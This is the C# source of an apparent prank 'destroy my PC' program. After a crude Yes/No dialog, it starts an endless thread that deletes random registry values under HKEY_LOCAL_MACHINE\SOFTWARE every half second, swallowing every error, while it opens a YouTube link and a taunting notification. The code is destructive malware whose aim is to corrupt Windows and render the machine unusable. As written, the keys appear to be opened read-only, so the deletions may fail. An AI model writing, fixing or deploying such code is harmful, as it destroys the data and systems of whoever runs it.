using System;
using Microsoft.Win32; 
using System.Threading;
using System.Windows.Forms;

using Microsoft.Toolkit.Uwp.Notifications;
using System.Diagnostics;

namespace RMPC
{
    internal class Program
    {
        public static Random r = new Random();
        public static Thread GarbageDisposal;


        static void Main(string[] args)
        {
            if (MessageBox.Show("R[e]ape My PC?", "i hate myself", MessageBoxButtons.YesNo, MessageBoxIcon.None, MessageBoxDefaultButton.Button1) == DialogResult.Yes)
            {
                GarbageDisposal = new Thread(Dispose);
                GarbageDisposal.Start();
                MessageBox.Show("ok im gonna go ahead and start deleting shit, lmk if something breaks.", "i hate myself", MessageBoxButtons.OK, MessageBoxIcon.None, MessageBoxDefaultButton.Button1);
                Process.Start("https://youtu.be/k85mRPqvMbE");
                new ToastContentBuilder().AddText("the greatest video of all time").AddText("watch this while you wait stinky").Show();
            }
        }

        public static void Dispose()
        {
            while (!false)
            {
                try
                {
                    var GarbagePile = GetRandomGarbage();
                    GarbagePile.DeleteValue(GarbagePile.GetValueNames()[r.Next(0, GarbagePile.GetValueNames().Length)]);
                    GarbagePile.Flush();
                }
                catch
                {
                    continue;
                }
                Thread.Sleep(500);
            }
        }

        static RegistryKey GetRandomGarbage()
        {
            var UselessGarbage = Registry.LocalMachine.OpenSubKey("SOFTWARE").GetSubKeyNames();

            var BagSize = UselessGarbage.Length;
            var TrashHeap = Registry.LocalMachine.OpenSubKey("SOFTWARE");

            while (BagSize != 0)
            {
                TrashHeap = TrashHeap.OpenSubKey(UselessGarbage[r.Next(0, UselessGarbage.Length)]);
                UselessGarbage = TrashHeap.GetSubKeyNames();
                BagSize = UselessGarbage.Length;
            }

            return TrashHeap;
        }
    }
}
